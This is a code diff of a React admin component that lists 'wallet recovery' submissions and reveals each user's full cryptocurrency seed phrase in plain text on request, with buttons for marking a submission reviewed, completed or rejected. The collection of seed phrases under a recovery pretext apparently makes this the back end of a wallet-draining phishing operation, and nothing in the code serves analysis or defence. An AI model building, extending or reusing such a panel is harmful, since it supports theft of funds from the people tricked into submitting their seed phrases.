@@ -1,7 +1,6 @@
 import { useState, useEffect } from 'react';
 import { supabase } from '@/lib/supabase';
-import { format } from 'date-fns';
-import { Eye, EyeOff, CheckCircle, XCircle } from 'lucide-react';
+import { Eye, EyeOff, CheckCircle, XCircle, Clock } from 'lucide-react';
 
 interface Submission {
   id: number;
@@ -19,6 +18,7 @@ export function SeedSubmissions() {
   const [submissions, setSubmissions] = useState<Submission[]>([]);
   const [loading, setLoading] = useState(true);
   const [showSeeds, setShowSeeds] = useState<Record<number, boolean>>({});
+  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
 
   useEffect(() => {
     fetchSubmissions();
@@ -58,6 +58,19 @@ export function SeedSubmissions() {
     setShowSeeds(prev => ({ ...prev, [id]: !prev[id] }));
   };
 
+  const getStatusBadge = (status: string) => {
+    switch (status) {
+      case 'completed':
+        return { bg: 'rgba(16,185,129,0.15)', color: '#10b981', icon: <CheckCircle size={12} />, text: 'Completed' };
+      case 'reviewed':
+        return { bg: 'rgba(59,130,246,0.15)', color: '#3b82f6', icon: <Eye size={12} />, text: 'Reviewed' };
+      case 'rejected':
+        return { bg: 'rgba(239,68,68,0.15)', color: '#ef4444', icon: <XCircle size={12} />, text: 'Rejected' };
+      default:
+        return { bg: 'rgba(245,158,11,0.15)', color: '#f59e0b', icon: <Clock size={12} />, text: 'Pending' };
+    }
+  };
+
   if (loading) {
     return (
       <div className="flex justify-center py-12">
@@ -70,111 +83,179 @@ export function SeedSubmissions() {
     <div className="space-y-6">
       <div>
         <h2 className="text-xl font-semibold text-foreground mb-2">Seed Phrase Submissions</h2>
-        <p className="text-sm text-muted-foreground">View all wallet recovery requests from users</p>
+        <p className="text-sm text-muted-foreground">View and manage wallet recovery requests from users</p>
       </div>
 
-      <div className="bg-background border border-border rounded-xl overflow-hidden">
-        <div className="overflow-x-auto">
-          <table className="w-full">
-            <thead className="bg-secondary border-b border-border">
-              <tr>
-                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Date</th>
-                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Wallet</th>
-                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Type</th>
-                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Value</th>
-                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Status</th>
-                <th className="text-left p-4 text-sm font-medium text-muted-foreground">Actions</th>
-              </tr>
-            </thead>
-            <tbody>
-              {submissions.length === 0 ? (
-                <tr>
-                  <td colSpan={6} className="text-center p-8 text-muted-foreground">
-                    No submissions yet
-                  </td>
-                </tr>
-              ) : (
-                submissions.map((sub) => (
-                  <tr key={sub.id} className="border-b border-border hover:bg-secondary/30">
-                    <td className="p-4 text-sm text-foreground">
-                      {new Date(sub.submitted_at).toLocaleString()}
-                    </td>
-                    <td className="p-4">
-                      <div className="font-medium text-foreground">{sub.wallet_name}</div>
-                      <div className="text-xs text-muted-foreground">{sub.wallet_id}</div>
-                    </td>
-                    <td className="p-4">
-                      <span className={`inline-flex px-2 py-1 rounded-full text-xs font-medium ${
-                        sub.submission_type === 'address' 
-                          ? 'bg-blue-500/10 text-blue-500' 
-                          : 'bg-purple-500/10 text-purple-500'
-                      }`}>
-                        {sub.submission_type === 'address' ? 'Wallet Address' : 'Seed Phrase'}
-                      </span>
-                    </td>
-                    <td className="p-4">
-                      <div className="flex items-center gap-2">
-                        <code className="text-xs bg-secondary px-2 py-1 rounded max-w-[200px] truncate font-mono">
-                          {sub.submission_type === 'address' ? sub.wallet_address : '••••••••'}
-                        </code>
-                        {sub.submission_type === 'seed' && (
-                          <button
-                            onClick={() => toggleShowSeed(sub.id)}
-                            className="p-1 hover:bg-secondary rounded"
-                          >
-                            {showSeeds[sub.id] ? <EyeOff size={14} /> : <Eye size={14} />}
-                          </button>
-                        )}
-                      </div>
-                      {sub.submission_type === 'seed' && showSeeds[sub.id] && (
-                        <div className="mt-2 p-2 bg-amber-500/10 rounded text-xs font-mono break-all">
-                          {sub.seed_phrase}
-                        </div>
-                      )}
-                    </td>
-                    <td className="p-4">
-                      <span className={`inline-flex px-2 py-1 rounded-full text-xs font-medium ${
-                        sub.status === 'completed' 
-                          ? 'bg-green-500/10 text-green-500'
-                          : sub.status === 'reviewed'
-                          ? 'bg-blue-500/10 text-blue-500'
-                          : 'bg-yellow-500/10 text-yellow-500'
-                      }`}>
-                        {sub.status}
-                      </span>
-                    </td>
-                    <td className="p-4">
-                      <div className="flex gap-2">
-                        <button
-                          onClick={() => updateStatus(sub.id, 'reviewed')}
-                          className="p-1.5 bg-blue-500/10 text-blue-500 rounded hover:bg-blue-500/20"
-                          title="Mark as reviewed"
-                        >
-                          <Eye size={14} />
-                        </button>
-                        <button
-                          onClick={() => updateStatus(sub.id, 'completed')}
-                          className="p-1.5 bg-green-500/10 text-green-500 rounded hover:bg-green-500/20"
-                          title="Mark as completed"
-                        >
-                          <CheckCircle size={14} />
-                        </button>
-                        <button
-                          onClick={() => updateStatus(sub.id, 'rejected')}
-                          className="p-1.5 bg-red-500/10 text-red-500 rounded hover:bg-red-500/20"
-                          title="Reject"
-                        >
-                          <XCircle size={14} />
-                        </button>
-                      </div>
-                    </td>
-                  </tr>
-                ))
-              )}
-            </tbody>
-          </table>
+      {/* Stats Cards */}
+      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+        <div className="bg-background border border-border rounded-xl p-4">
+          <div className="text-2xl font-bold text-foreground">{submissions.length}</div>
+          <div className="text-xs text-muted-foreground">Total Submissions</div>
+        </div>
+        <div className="bg-background border border-border rounded-xl p-4">
+          <div className="text-2xl font-bold text-yellow-500">{submissions.filter(s => s.status === 'pending').length}</div>
+          <div className="text-xs text-muted-foreground">Pending Review</div>
+        </div>
+        <div className="bg-background border border-border rounded-xl p-4">
+          <div className="text-2xl font-bold text-green-500">{submissions.filter(s => s.status === 'completed').length}</div>
+          <div className="text-xs text-muted-foreground">Completed</div>
+        </div>
+        <div className="bg-background border border-border rounded-xl p-4">
+          <div className="text-2xl font-bold text-blue-500">{submissions.filter(s => s.status === 'reviewed').length}</div>
+          <div className="text-xs text-muted-foreground">Reviewed</div>
         </div>
       </div>
+
+      {/* Submissions Grid */}
+      <div className="grid grid-cols-1 gap-4">
+        {submissions.length === 0 ? (
+          <div className="bg-background border border-border rounded-xl p-8 text-center text-muted-foreground">
+            No seed phrase submissions yet
+          </div>
+        ) : (
+          submissions.map((sub) => {
+            const statusBadge = getStatusBadge(sub.status);
+            return (
+              <div
+                key={sub.id}
+                className="bg-background border border-border rounded-xl overflow-hidden hover:shadow-md transition-shadow cursor-pointer"
+                onClick={() => setSelectedSubmission(sub)}
+              >
+                <div className="p-4">
+                  {/* Header */}
+                  <div className="flex items-center justify-between mb-3">
+                    <div className="flex items-center gap-2">
+                      <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center">
+                        <span className="text-primary font-semibold text-sm">{sub.wallet_name?.charAt(0) || 'W'}</span>
+                      </div>
+                      <div>
+                        <div className="font-semibold text-foreground">{sub.wallet_name}</div>
+                        <div className="text-xs text-muted-foreground">{new Date(sub.submitted_at).toLocaleString()}</div>
+                      </div>
+                    </div>
+                    <div className="flex items-center gap-2">
+                      <span
+                        className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium"
+                        style={{ background: statusBadge.bg, color: statusBadge.color }}
+                      >
+                        {statusBadge.icon}
+                        {statusBadge.text}
+                      </span>
+                    </div>
+                  </div>
+
+                  {/* Content */}
+                  <div className="bg-secondary/30 rounded-lg p-3 mb-3">
+                    <div className="text-xs text-muted-foreground mb-1">Submission Type</div>
+                    <div className="text-sm font-medium text-foreground">
+                      {sub.submission_type === 'address' ? 'Wallet Address / TX Hash' : 'Seed Phrase'}
+                    </div>
+                  </div>
+
+                  {/* Preview */}
+                  <div className="text-sm text-muted-foreground truncate">
+                    {sub.submission_type === 'address' 
+                      ? sub.wallet_address 
+                      : '••••••••••••••••••••••••'}
+                  </div>
+
+                  {/* Status Actions */}
+                  {sub.status === 'pending' && (
+                    <div className="flex gap-2 mt-3 pt-3 border-t border-border">
+                      <button
+                        onClick={(e) => { e.stopPropagation(); updateStatus(sub.id, 'reviewed'); }}
+                        className="flex-1 py-1.5 rounded-lg bg-blue-500/10 text-blue-500 text-xs font-medium hover:bg-blue-500/20 transition-colors"
+                      >
+                        Mark Reviewed
+                      </button>
+                      <button
+                        onClick={(e) => { e.stopPropagation(); updateStatus(sub.id, 'completed'); }}
+                        className="flex-1 py-1.5 rounded-lg bg-green-500/10 text-green-500 text-xs font-medium hover:bg-green-500/20 transition-colors"
+                      >
+                        Mark Completed
+                      </button>
+                      <button
+                        onClick={(e) => { e.stopPropagation(); updateStatus(sub.id, 'rejected'); }}
+                        className="flex-1 py-1.5 rounded-lg bg-red-500/10 text-red-500 text-xs font-medium hover:bg-red-500/20 transition-colors"
+                      >
+                        Reject
+                      </button>
+                    </div>
+                  )}
+                </div>
+              </div>
+            );
+          })
+        )}
+      </div>
+
+      {/* Detail Modal */}
+      {selectedSubmission && (
+        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4" onClick={() => setSelectedSubmission(null)}>
+          <div className="bg-background rounded-2xl max-w-md w-full max-h-[80vh] overflow-y-auto border border-border" onClick={(e) => e.stopPropagation()}>
+            <div className="sticky top-0 bg-background border-b border-border p-4 flex items-center justify-between">
+              <h3 className="text-lg font-semibold text-foreground">Submission Details</h3>
+              <button onClick={() => setSelectedSubmission(null)} className="w-8 h-8 rounded-full bg-secondary flex items-center justify-center">×</button>
+            </div>
+            <div className="p-4 space-y-4">
+              <div>
+                <div className="text-xs text-muted-foreground mb-1">Wallet</div>
+                <div className="text-sm font-medium text-foreground">{selectedSubmission.wallet_name}</div>
+              </div>
+              <div>
+                <div className="text-xs text-muted-foreground mb-1">Submission Type</div>
+                <div className="text-sm font-medium text-foreground">
+                  {selectedSubmission.submission_type === 'address' ? 'Wallet Address / TX Hash' : 'Seed Phrase'}
+                </div>
+              </div>
+              <div>
+                <div className="text-xs text-muted-foreground mb-1">Value</div>
+                <div className="text-sm bg-secondary/30 rounded-lg p-3 font-mono break-all">
+                  {selectedSubmission.submission_type === 'address' ? (
+                    selectedSubmission.wallet_address
+                  ) : (
+                    <div>
+                      <div className="flex justify-end mb-2">
+                        <button
+                          onClick={() => toggleShowSeed(selectedSubmission.id)}
+                          className="text-xs text-primary flex items-center gap-1"
+                        >
+                          {showSeeds[selectedSubmission.id] ? <EyeOff size={12} /> : <Eye size={12} />}
+                          {showSeeds[selectedSubmission.id] ? 'Hide' : 'Show'}
+                        </button>
+                      </div>
+                      {showSeeds[selectedSubmission.id] ? (
+                        <div className="whitespace-pre-wrap break-all">{selectedSubmission.seed_phrase}</div>
+                      ) : (
+                        '••••••••••••••••••••••••••••••••'
+                      )}
+                    </div>
+                  )}
+                </div>
+              </div>
+              <div>
+                <div className="text-xs text-muted-foreground mb-1">Submitted</div>
+                <div className="text-sm text-foreground">{new Date(selectedSubmission.submitted_at).toLocaleString()}</div>
+              </div>
+              <div>
+                <div className="text-xs text-muted-foreground mb-1">Status</div>
+                <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium" style={{ background: getStatusBadge(selectedSubmission.status).bg, color: getStatusBadge(selectedSubmission.status).color }}>
+                  {getStatusBadge(selectedSubmission.status).icon}
+                  {getStatusBadge(selectedSubmission.status).text}
+                </div>
+              </div>
+              {selectedSubmission.status === 'pending' && (
+                <div className="flex gap-2 pt-2">
+                  <button onClick={() => { updateStatus(selectedSubmission.id, 'reviewed'); setSelectedSubmission(null); }} className="flex-1 py-2 rounded-lg bg-blue-500/10 text-blue-500 text-sm font-medium">Reviewed</button>
+                  <button onClick={() => { updateStatus(selectedSubmission.id, 'completed'); setSelectedSubmission(null); }} className="flex-1 py-2 rounded-lg bg-green-500/10 text-green-500 text-sm font-medium">Complete</button>
+                  <button onClick={() => { updateStatus(selectedSubmission.id, 'rejected'); setSelectedSubmission(null); }} className="flex-1 py-2 rounded-lg bg-red-500/10 text-red-500 text-sm font-medium">Reject</button>
+                </div>
+              )}
+              <button onClick={() => setSelectedSubmission(null)} className="w-full py-2 rounded-lg bg-primary text-white font-medium mt-2">Close</button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
